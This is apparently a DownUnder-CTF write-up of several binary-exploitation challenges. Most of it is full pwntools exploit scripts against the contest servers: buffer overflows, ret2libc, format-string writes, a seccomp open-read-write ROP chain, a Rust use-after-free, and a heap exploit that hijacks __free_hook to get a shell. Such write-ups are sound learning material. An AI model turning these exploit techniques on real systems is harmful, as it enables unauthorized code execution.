# DownUnder-CTF 

## Shell this

1. Return to backdoor function in the binary. BOF

```python
from pwn import *
from past.builtins import xrange
from time import sleep
import random

####Exe
exe = context.binary = ELF('./ss')

####Exploit
if __name__=='__main__':
	io = remote('chal.duc.tf',30002)
	L_ROP = b'A'*0x38+\
		p64(exe.sym.get_shell)

	io.sendlineafter('your name: ',L_ROP)
	io.interactive()
```

## Return to what

1. Return to libc. BOF

```python
#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

####Exe
exe = context.binary = ELF('./return-to-what')

####Gadgets
L_pop_rdi = 0x0040122b
L_pop_rsi = 0x00401229

####Exploit
if __name__ == '__main__':
#	io = process('./return-to-what')
	io = remote('chal.duc.tf', 30003)
	L_ROP = b'A'*0x38+\
		p64(L_pop_rdi)+\
		p64(exe.got['gets'])+\
		p64(exe.sym.puts)+\
		p64(exe.sym.main)
	io.recv()
	io.sendline(L_ROP)
	libc_leak = u64(io.recvline().strip().ljust(8,b'\x00'))-0x0800b0
	print(hex(libc_leak))
	L_ROP = b'A'*0x38+\
		p64(L_pop_rdi)+\
		p64(libc_leak+0x1b3e9a)+\
		p64(0x00401090)+\
		p64(libc_leak+0x04f440)
	io.sendline(L_ROP)
	io.interactive()
```

## My first echo server

1. I am too lazy to write format string payloads by hand. SO i used library to write it for me.

```python
#!/usr/bin/python3
from pwn import *
from formatstring import *
from past.builtins import xrange
from time import sleep
import random

exe = ELF('./echos')
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')

####Exploit
if __name__=='__main__':
#	io = process([exe.path],env={'LD_PRELOAD':libc.path})
	io = remote('chal.duc.tf',30001)
	settings = PayloadSettings(offset=8,arch=x86_64)
	p = WritePayload()
	io.sendline('|%6$p|%18$p|%19$p|')
	leaks = io.recvline().strip().split(b'|')
	print(leaks)
	stack_leak = int(leaks[1],0)
	pbase = int(leaks[2],0)-0x890
	libc_base = int(leaks[3],0)-0x21b97

	print("stack= ",hex(stack_leak))
	print("PIE = ", hex(pbase))
	print("libc= ",hex(libc_base))

	return_addr = stack_leak+0x48
	var = stack_leak-0x14
	D = WritePayload()
	D[var] = p64(0xfffffffffffffff0)
	payload2 = D.generate(settings)
	io.sendline(payload2)
	print(hex(return_addr))

#	io.recv()
	psss = 0x000008f3
	get = 0x80120
	ret = 0x00000731
	print(hex(pbase+psss))
	pause()
	io.sendline('A')
	io.recvuntil('A')

	peo = WritePayload()
	peo[return_addr] = p64(pbase+psss)
	j = peo.generate(settings)
	io.sendline(j)

	ppp = WritePayload()
	ppp[return_addr+0x8] = p64(libc_base+0x1b3e9a)
	asd = ppp.generate(settings)
	io.sendline(asd)

	kkk = WritePayload()
	kkk[return_addr+0x10] = p64(pbase+ret)
	lll = kkk.generate(settings)
	io.sendline(lll)

	ooo = WritePayload()
	ooo[return_addr+0x18] = p64(libc_base+0x04f440)
	eee = ooo.generate(settings)
	io.sendline(eee)
	io.interactive()
```

## Return 2 what revenge

1. Same as return 2 what. but with seccomp, ORW to get flag (open-read-write)

```python
#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

####Exe
exe = context.binary = ELF('./return-to-whats-revenge')

####Gadgets
R_pop_rdi = 0x004019db
L_pop_rax = 0x000bcd77
L_pop_rdx = 0x00001ba6
L_pop_rsi = 0x0015d404
L_pop_rdi = 0x0016404a
L_syscall = 0x000e5935

####Addr
open = 	0x10fc40
read = 	0x110070
write = 0x110140
bss = 0x404020

####Exploit
if __name__ == '__main__':
#	io = process('./return-to-whats-revenge',env={'LD_PRELOAD':'./libc6_2.27-3ubuntu1_amd64.so'})
	io = remote('chal.duc.tf', 30006)
	L_ROP = b'A'*0x38+\
		p64(R_pop_rdi)+\
		p64(exe.got['gets'])+\
		p64(exe.sym.puts)+\
		p64(exe.sym.main)
	io.recv()
	io.sendline(L_ROP)

	libc_leak = u64(io.recvline().strip().ljust(8,b'\x00'))-0x0800b0
	print(hex(libc_leak))
	L_ROP = b'A'*0x38+\
		p64(libc_leak+L_pop_rdi)+p64(bss)+\
		p64(libc_leak+0x800b0)+\
		p64(libc_leak+L_pop_rdi)+p64(bss)+\
		p64(libc_leak+L_pop_rsi)+p64(0x0)+\
		p64(libc_leak+L_pop_rax)+p64(0x2)+\
		p64(libc_leak+L_syscall)+\
		p64(libc_leak+L_pop_rdi)+p64(0x3)+\
		p64(libc_leak+L_pop_rsi)+p64(bss)+\
		p64(libc_leak+L_pop_rdx)+p64(0x50)+\
		p64(libc_leak+L_pop_rax)+p64(0x0)+\
		p64(libc_leak+L_syscall)+\
		p64(libc_leak+L_pop_rdi)+p64(0x1)+\
		p64(libc_leak+L_pop_rax)+p64(0x1)+\
		p64(libc_leak+L_syscall)+\
		p64(libc_leak+L_pop_rax)+p64(0x3c)+\
		p64(libc_leak+L_syscall)
	io.sendline(L_ROP)
	pause()
	io.sendline('/chal/flag.txt')

	io.interactive()
```

## Zombies

1. We are give a rust compiled binary and source code. I won't go into much detail but it was pretty cool challenge.

2. I quickly saw this lines on the source codes.

```rust

// Issue 25860

fn cell<'a, 'b, T: ?Sized>(_: &'a &'b (), v: &'b mut T) -> &'a mut T { v }

fn virus<'a, T: ?Sized>(input: &'a mut T) -> &'static mut T {
	let f: fn(_, &'a mut T) -> &'static mut T = cell;
	f(&&(), input)
}

fn zombie(size: usize) -> &'static mut [u8] {
	let mut object = vec![b'A'; size];
	let r = virus(object.as_mut());
	r
}
```
- and i searched for the issue on github. (Issue 25860)
[github issue link](https://github.com/rust-lang/rust/issues/25860)
basically what it does is make the static variable lifetime infinite and when we return from the function the variable gets freed, but whatever we can still use that variable because of the wierd thing(making lifetime infinite) which makes Use After free. So we can use eat zombie function to change the input to `get flag`.

```python
#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

####Zombies
def infect(number):
	io.sendlineafter('do?\n','infect')
	io.sendlineafter('infect?\n',str(number))

def dick(s,l):
	io.sendlineafter(s,l)


####Brains?
p_o = 'do?\n'
O_o = ' '
oOOo = 'done'

####Zombie injection
_O_O_ = 'get flag'

####Zombie killer
if __name__ == '__main__':
#	io = process('./zombie')
	io = remote('chal.duc.tf',30008)

	infect(0x48)
	dick(p_o,'B'*0x47)
	dick(p_o,'eat brains'.ljust(0x47,O_o))

	for i in range(len(_O_O_)):
		io.sendlineafter('victim.\n',str(i))
		io.sendlineafter('Munch!\n',str(ord(_O_O_[i])))

	io.sendlineafter('victim.\n','8')
	io.sendlineafter('Munch!\n',str(ord(O_o)))
	io.sendlineafter('victim.\n','9')
	io.sendlineafter('Munch!\n',str(ord(O_o)))

	io.sendlineafter('victim.\n',oOOo)
	io.interactive()
```

## VECC

1. A heap exp challenge without giving libc.
2. Should we guess what glibc is running remote. :(
3. Yes we should.
4. Get unsortedbin.
5. Uninitialized memory after freeing the chunks.
6. create vecc
7. The first two qwadwords are adddress from Main arena. :P
8. Use showvec to dump all of the main_arena. leak libc. And also it leaks environment variables. THis is how i got to know the libc version.
9. Clear vec will set the size field to 0.
10. Append vec will lead to writing anything we want to main_arena and beyond it.
11. Since we can write beyond it. Prepare ROP chain on main_arena.
12. Set `__free_hook` to setcontext+53 which can be used to control the rsp.
13. It directly frees the variable which it allocated before appending the vec.
14. No output function before freeing the chunk back. So we don't worry about crashing the process.
But whatever
15. stack migration to main_arena. Execve ROP chain get shell.

```python
#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

###Bin
exe = context.binary = ELF('./vec')
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')

####Utils
def create(idx):
	io.sendlineafter('> ','1')
	io.sendlineafter('Index?\n',str(idx))

def appendvec(idx,leng,data):
	io.sendlineafter('> ','3')
	io.sendlineafter('Index?\n',str(idx))
	io.sendlineafter('Length?\n> ',str(leng))
	io.sendline(data)

def clearvec(idx):
	io.sendlineafter('> ','4')
	io.sendlineafter('Index?\n',str(idx))

def showvec(idx):
	io.sendlineafter('> ','5')
	io.sendlineafter('Index?\n',str(idx))
	vec = io.recvn(0x100)
	return vec

'''
	|  0x4	|  0x4	|  0x4	|  0x4	|
-----------------------------------------
0x10	|      vec 	|  wut	|  size	|

'''
####Addr
L_pop_rdi = 0x00400e73
fuck = 0x4f440
set_context = 0x520a5
marena = 0x3ec140
L_pop_rsi = 0x00156455
L_pop_rax = 0x00043b80
L_syscall = 0x000e5905
L_pop_rdx = 0x00001ba6

####Exploit
if __name__ == '__main__':
#	io = process([exe.path],env={'LD_PRELOAD':libc.path})
	io = remote('chal.duc.tf', 30007)
	create(0)
	appendvec(0,0x418,'A'*0x417)
	create(1)

	libc_leak = u64(showvec(1)[0x12:0x1a])-0x3ec090
	print(hex(libc_leak))
	clearvec(1)

	L_ROP = b'A'*0x9f+\
		p64(libc_leak+marena)+\
		p64(L_pop_rdi)+\
		p64(libc_leak+0x3ec180)+\
		p64(libc_leak+L_pop_rsi)+\
		p64(0x0)+\
		p64(libc_leak+L_pop_rdx)+\
		p64(0x0)+\
		p64(libc_leak+L_pop_rax)+\
		p64(0x3b)+\
		p64(libc_leak+L_syscall)+\
		b'/bin/sh\x00'
	appendvec(1,0x1860,L_ROP.ljust(0x186f-0x18,b'A')+p64(libc_leak+set_context)+b'A'*0x10)
	io.interactive()
```
- btw I did Execve ROP chain of syscall is because we overwrote all of the stdout structure with our spammed A's,
And we won't get any output since it's broken. I tried Gadgets, system. None worked. Decided to Do ROP chain using setcontext because of that.

